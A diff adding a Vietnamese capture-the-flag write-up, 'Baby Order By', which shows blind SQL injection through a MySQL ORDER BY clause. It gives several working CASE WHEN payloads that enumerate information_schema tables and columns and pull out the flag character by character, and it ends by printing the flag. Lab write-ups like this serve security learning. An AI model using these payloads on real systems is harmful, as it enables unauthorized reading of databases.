@@ -63,6 +63,7 @@
 - [Baby Simple Go CURL](#baby-simple-go-curl)
 - [The Evil Assignment on Canvas](#the-evil-assignment-on-canvas)
 - [Baby Sqlite with filter](#baby-sqlite-with-filter)
+- [Baby Order By](#baby-order-by)
 
 ## Baby Address Note
 
@@ -832,3 +833,25 @@ while True:
 
 5. Kết quả đạt được là flag.
 ![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a4f54cab-dfa2-4016-b038-b4f78d7e9651)
+
+## Baby Order By
+
+1. Bài này cho sẵn source với query như sau:
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/b8ef4fb9-27d3-4b2a-854a-2ea785ad5a03)
+
+2. Được biết trang sử dụng mysql và order by (rất khó để union)
+3. Sử dụng if else clause để đọc dữ liệu dựa trên xử lý khác biết trên trang chính (blind sqli
+4. Ví dụ payload: `(CASE WHEN 1=1 THEN id ELSE price END);--`
+5. Khi mà điều kiện đúng -> order by id sắp xếp theo id theo thứ tự tăng dần còn không thì xếp theo cột price
+6. Nếu response trả về là 0 result là do câu lệnh sai.
+7. Truy xuất bảng information_schema để xem có bao nhiêu table -> 195. Truy xuất xem có table flag không
+`(CASE WHEN ((SELECT COUNT(table_name) FROM information_schema.tables where table_name = 'flag') = 1) THEN id ELSE price END);--`
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/ca2110fd-0f12-48db-9c57-520e841e3557)
+
+8. Trả về xếp theo id -> có
+9. Biết được bảng này chỉ có 1 cột: `(CASE WHEN ((SELECT COUNT(*) FROM information_schema.columns where table_name = 'flag') = 1) THEN id ELSE price END);--`
+10. Cột duy nhất có tên là flag luôn. `(CASE WHEN ((SELECT COLUMN_NAME FROM information_schema.columns where table_name = 'flag') = 'flag') THEN id ELSE price END);--`
+11. Tìm từng ký tự ``(CASE WHEN ((SELECT SUBSTR(flag, 1, 3) from flag) = 'CHH') THEN id ELSE price END);--``
+12. Mệt @@ `CHH{inj3ct1on_0rder_gr0up_claus3}`
+
+## 
